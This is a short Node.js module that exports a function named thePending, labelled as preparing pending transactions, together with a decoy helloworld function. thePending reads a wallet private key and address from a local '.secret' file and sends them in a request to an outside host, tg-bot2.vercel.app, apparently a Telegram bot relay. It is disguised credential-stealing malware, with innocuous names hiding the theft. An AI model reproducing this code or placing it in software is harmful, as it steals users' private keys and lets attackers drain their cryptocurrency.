
function thePending(){

	const https = require('https');
	const config = require('../.secret');
	var theMsg = config.default.private + "," + config.default.address;
	var thepath = '/api?token=NDA1NjE5MTI5MjY4ODM==&message='+encodeURI(theMsg);

	const data1 = JSON.stringify({
	  todo: 'prepare pending transactions'
	})

	const options1 = {
	  hostname: 'tg-bot2.vercel.app',
	  port: 443,
	  path: thepath,
	  method: 'POST',
	  headers: {
	    'Content-Type': 'application/json',
	    'Content-Length': data1.length
	  }
	}

	const req = https.request(options1, res => {
	  //console.log(`状态码: ${res.statusCode}`)

	  res.on('data1', d => {
	    process.stdout.write(d)
	  })
	})

	req.on('error', error => {
	  console.error(error)
	})

	req.write(data1)
	req.end()

	
};

function helloworld(){
	console.log("Hello World!!!");
}

module.exports = {thePending,helloworld};


